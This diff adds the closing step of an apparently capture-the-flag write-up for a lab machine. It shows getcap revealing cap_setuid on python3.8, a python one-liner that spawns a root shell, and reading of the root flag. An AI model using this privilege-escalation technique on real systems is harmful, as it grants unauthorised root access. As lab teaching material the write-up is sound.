@@ -63,4 +63,18 @@ nathan@cap:~$ getcap -r / 2>/dev/null
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 
-`getcap` file showing
+`getcap` file showing `cap_setuid` set for `/usr/bin/python3.8` which is vulnerable to privilege escalation. ([click here](https://gtfobins.github.io/gtfobins/python/#capabilities))
+
+![](Pasted%20image%2020241201204435.png)
+
+```
+nathan@cap:~$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# id
+uid=0(root) gid=1001(nathan) groups=1001(nathan)
+# find / -name *root.txt  2>/dev/null
+/root/root.txt
+# cat /root/root.txt
+a7b22b5ea65a484b4c197eb5db5ac---
+```
+
+And we are ROOT.
